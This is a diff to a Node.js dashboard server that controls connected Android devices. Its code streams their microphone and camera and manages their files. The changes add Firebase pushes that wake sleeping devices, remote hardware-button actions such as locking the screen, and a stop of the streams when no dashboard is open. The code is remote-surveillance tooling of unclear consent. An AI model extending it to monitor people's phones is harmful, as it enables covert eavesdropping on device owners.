@@ -7,6 +7,7 @@ const deviceStore = require("../models/deviceStore");
 const dashboardStore = require("../models/dashboardStore");
 const { normalizeDeviceId } = require("../utils/device");
 const { broadcastToDashboard } = require("../services/dashboardService");
+const { wakeDevice } = require("../services/firebaseService");
 
 
 let streamRecoveryTimer = null;
@@ -19,6 +20,26 @@ function handleDashboard(ws) {
   // IMPORTANT: we do NOT auto-start audio on all devices.
   // Starting streams on every device causes audio floods when multiple devices are connected.
   // Streams should start only when the user presses "Listen" on a specific device.
+
+  // ── FCM Ghost Node: Wake sleeping devices ────────────────────────────
+  // If a device has an FCM token but no active WS connection, fire a
+  // high-priority wakeup pulse via Google's servers to pierce Deep Doze.
+  if (wasEmpty) {
+    // Also check offline devices that have stored FCM tokens
+    const offlineTokens = deviceStore.getOfflineFcmTokens?.() || [];
+    for (const { deviceId: offId, fcmToken } of offlineTokens) {
+      if (!deviceStore.isOnline(offId) && fcmToken) {
+        console.log(`💤 Device ${offId} is offline. Firing FCM Wakeup!`);
+        wakeDevice(fcmToken).catch(() => {});
+      }
+    }
+  }
+  deviceStore.forEachDevice((dev, deviceId) => {
+    if (dev.fcmToken && (!dev.ws || dev.ws.readyState !== WebSocket.OPEN)) {
+      console.log(`💤 Device ${deviceId} has stale WS. Firing FCM Wakeup!`);
+      wakeDevice(dev.fcmToken).catch(() => {});
+    }
+  });
 
   const deviceList = deviceStore.listDevices();
   ws.send(JSON.stringify({ type: "device_list", devices: deviceList }));
@@ -400,6 +421,26 @@ function handleDashboard(ws) {
           });
           console.log(`📁 Create dir: ${msg.path} → ${targetId}`);
           break;
+        // ── Remote Hardware Button Control ──────────────────────────────
+        case "system_action":
+          {
+            const action = String(msg.action || "").trim().toLowerCase();
+            const validActions = [
+              "volume_up", "volume_down", "volume_mute",
+              "home", "back", "recents",
+              "power_dialog", "lock_screen"
+            ];
+            if (!validActions.includes(action)) {
+              ws.send(JSON.stringify({ type: "error", message: `Invalid system_action: ${action}` }));
+              break;
+            }
+            safeSendJson({
+              type: "system_action",
+              action,
+            });
+            console.log(`🎮 System action "${action}" sent to ${targetId}`);
+          }
+          break;
         default:
           console.warn(`Unknown dashboard command: ${cmd}`);
       }
@@ -412,10 +453,19 @@ function handleDashboard(ws) {
     dashboardStore.removeClient(ws);
     console.log("👋 Dashboard client disconnected");
 
-    // S-H2 fix: Do NOT send stop_stream when last dashboard disconnects.
-    // The server already skips audio routing when no dashboard is subscribed
-    // (deviceController.js line 319). Stopping the mic creates silent gaps
-    // on every dashboard reconnect, breaking 24/7 monitoring.
+    // SENIOR DEV FIX: On-Demand Architecture
+    // If there are no more dashboard clients connected to the server,
+    // tell all Android devices to shut down their hardware to kill the 
+    // green dot and save battery.
+    if (dashboardStore.size() === 0) {
+      deviceStore.forEachDevice((dev, deviceId) => {
+        if (dev && dev.ws && dev.ws.readyState === WebSocket.OPEN) {
+          console.log(`Sending auto-stop to ${deviceId} because dashboard closed.`);
+          dev.ws.send("stop_stream");
+          dev.ws.send(JSON.stringify({ type: "camera_live_stop" }));
+        }
+      });
+    }
   });
 
   ws.on("error", (err) => {
